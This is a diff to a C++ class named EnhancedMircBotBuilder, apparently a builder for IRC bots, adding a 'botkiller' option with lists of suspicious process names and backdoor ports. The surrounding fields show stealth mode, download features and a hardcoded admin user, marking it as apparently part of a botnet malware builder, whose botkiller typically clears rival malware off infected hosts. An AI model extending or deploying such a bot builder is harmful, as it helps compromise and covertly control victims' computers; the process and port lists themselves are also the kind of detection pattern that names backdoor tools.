@@ -34,6 +34,9 @@ private:
     bool enableDownloadFeatures;
     std::string downloadDirectory;
     bool stealthMode;
+    bool enableBotkiller;
+    std::vector<std::string> suspiciousProcessNames;
+    std::vector<std::string> suspiciousPorts;
     
 public:
     EnhancedMircBotBuilder() {
@@ -52,9 +55,35 @@ public:
         enableDownloadFeatures = true;
         downloadDirectory = "./downloads";
         stealthMode = true;
+        enableBotkiller = true;
         
         // Add default admin
         adminUsers.push_back("ItsMehRawrXD");
+        
+        // Default suspicious process names to detect
+        suspiciousProcessNames.push_back("bot");
+        suspiciousProcessNames.push_back("malware");
+        suspiciousProcessNames.push_back("backdoor");
+        suspiciousProcessNames.push_back("trojan");
+        suspiciousProcessNames.push_back("virus");
+        suspiciousProcessNames.push_back("keylogger");
+        suspiciousProcessNames.push_back("spyware");
+        suspiciousProcessNames.push_back("rootkit");
+        suspiciousProcessNames.push_back("miner");
+        suspiciousProcessNames.push_back("rat");
+        suspiciousProcessNames.push_back("stealer");
+        suspiciousProcessNames.push_back("ransomware");
+        
+        // Default suspicious ports
+        suspiciousPorts.push_back("6667");  // IRC
+        suspiciousPorts.push_back("8080");  // HTTP proxy
+        suspiciousPorts.push_back("4444");  // Common backdoor
+        suspiciousPorts.push_back("31337"); // Elite hacker port
+        suspiciousPorts.push_back("1337");  // Leet port
+        suspiciousPorts.push_back("3389");  // RDP
+        suspiciousPorts.push_back("5900");  // VNC
+        suspiciousPorts.push_back("12345"); // NetBus
+        suspiciousPorts.push_back("27374"); // SubSeven
     }
     
     void showMenu() {
